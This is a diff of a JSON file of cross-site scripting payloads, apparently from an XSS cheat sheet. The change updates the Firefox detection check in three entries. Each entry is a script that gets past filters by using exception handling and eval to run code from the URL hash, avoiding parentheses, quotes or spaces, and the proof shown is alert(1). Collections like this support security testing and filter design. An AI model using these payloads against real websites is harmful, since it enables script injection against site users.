@@ -39,19 +39,19 @@
   },
   {
     "description": "No parentheses using exception handling and location hash eval on all browsers",
-    "code": "<script>throw onerror=Uncaught=eval,e=new Error,e.message='/*'+location.hash,!!window.InstallTrigger?e:e.message</script>",
+    "code": "<script>throw onerror=Uncaught=eval,e=new Error,e.message='/*'+location.hash,window.mozInnerScreenX%1==0?e:e.message</script>",
     "browsers": ["chrome", "firefox", "edge", "safari"],
     "hash": "#*/;alert(1);"
   },
   {
     "description": "No parentheses, no quotes, no spaces using exception handling and location hash eval on all browsers",
-    "code": "<script>throw{},onerror=Uncaught=eval,h=location.hash,e={lineNumber:1,columnNumber:1,fileName:0,message:h[2]+h[1]+h},!!window.InstallTrigger?e:e.message</script>",
+    "code": "<script>throw{},onerror=Uncaught=eval,h=location.hash,e={lineNumber:1,columnNumber:1,fileName:0,message:h[2]+h[1]+h},window.mozInnerScreenX%1==0?e:e.message</script>",
     "browsers": ["chrome", "firefox", "edge", "safari"],
     "hash": "#*/;alert(1);"
   },
   {
     "description": "No parentheses, no quotes, no spaces, no curly brackets using exception handling and location hash eval on all browsers",
-    "code": "<script>throw/x/,onerror=Uncaught=eval,h=location.hash,e=Error,e.lineNumber=e.columnNumber=e.fileName=e.message=h[2]+h[1]+h,!!window.InstallTrigger?e:e.message</script>",
+    "code": "<script>throw/x/,onerror=Uncaught=eval,h=location.hash,e=Error,e.lineNumber=e.columnNumber=e.fileName=e.message=h[2]+h[1]+h,window.mozInnerScreenX%1==0?e:e.message</script>",
     "browsers": ["chrome", "firefox", "edge", "safari"],
     "hash": "#*/;alert(1);"
   },
